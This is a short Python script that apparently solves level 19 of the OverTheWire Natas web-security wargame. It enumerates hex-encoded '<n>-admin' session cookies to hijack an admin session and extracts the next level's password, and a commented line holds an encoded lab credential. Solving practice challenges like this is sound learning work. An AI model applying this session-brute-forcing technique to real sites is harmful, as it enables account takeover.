import requests
import re
from requests.auth import HTTPBasicAuth
def solve19(username, password):
    session = requests.session()
    session.auth = HTTPBasicAuth(username, password)
    #session.headers["Authorization"] = "Basic bmF0YXMxOTo0SXdJcmVrY3VabEE5T3NqT2tvVXR3VTZsaG9rQ1BZcw=="
    def getURL(id):
        session.cookies["PHPSESSID"] = id
        return f"http://natas19.natas.labs.overthewire.org/index.php"


    for i in range(1, 641):
        resp = session.get(getURL((str(i) + "-admin").encode('utf-8').hex()))
        if len(resp.content) > 1050:
            pw = re.findall(r'[a-zA-Z0-9]{32}', resp.text)[-1]
            return pw
